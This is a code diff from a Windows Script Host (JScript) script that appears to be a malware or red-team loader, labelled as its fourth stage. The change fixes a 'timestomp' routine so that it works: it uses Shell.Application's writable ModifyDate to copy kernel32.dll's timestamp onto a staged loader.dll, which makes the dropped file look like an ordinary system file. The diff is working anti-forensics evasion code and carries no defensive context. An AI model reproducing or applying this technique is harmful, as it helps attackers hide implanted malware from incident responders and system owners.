@@ -67,12 +67,20 @@ try {
 }
 
 // Stage 4: Timestomp — set timestamps to match kernel32.dll
+// FSO File.DateCreated/DateLastModified are read-only; use Shell.Application's
+// FolderItem.ModifyDate which is writable.
 log("[*] Timestomping loader.dll");
 try {
-    var kernel32 = fso.GetFile("C:\\Windows\\System32\\kernel32.dll");
-    var staged = fso.GetFile(loaderDll);
-    staged.DateCreated = kernel32.DateCreated;
-    staged.DateLastModified = kernel32.DateLastModified;
+    var sa = new ActiveXObject("Shell.Application");
+    var sysFolder = sa.NameSpace("C:\\Windows\\System32");
+    var kernel32 = sysFolder.ParseName("kernel32.dll");
+    var kModified = kernel32.ModifyDate;
+    var idx = loaderDll.lastIndexOf("\\");
+    var stagedDir = loaderDll.substring(0, idx);
+    var stagedName = loaderDll.substring(idx + 1);
+    var stagedFolder = sa.NameSpace(stagedDir);
+    var stagedItem = stagedFolder.ParseName(stagedName);
+    stagedItem.ModifyDate = kModified;
     log("[+] Timestomp complete");
 } catch(e) {
     log("[-] Timestomp FAILED: " + e.message);
